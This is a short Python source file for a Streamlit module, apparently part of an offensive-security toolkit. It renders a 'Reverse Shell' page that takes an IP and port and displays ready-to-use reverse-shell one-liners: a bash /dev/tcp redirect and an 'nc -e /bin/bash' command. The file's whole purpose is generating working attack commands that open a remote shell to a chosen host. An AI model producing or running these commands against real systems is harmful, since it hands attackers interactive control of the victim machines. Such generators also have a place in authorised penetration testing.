import streamlit as st
from modules.base import BaseModule,ModuleRegistry
class ReverseShellModule(BaseModule):
    def __init__(self): super().__init__("Reverse Shell","reverse_shell"); ModuleRegistry.register(self)
    def render(self):
        st.header("Reverse Shell"); ip=st.text_input("IP","127.0.0.1"); p=st.text_input("Port","9001")
        for n,t in {"Bash":f"bash -i >& /dev/tcp/{ip}/{p} 0>&1","NC":f"nc {ip} {p} -e /bin/bash"}.items():
            st.code(t)
ReverseShellModule()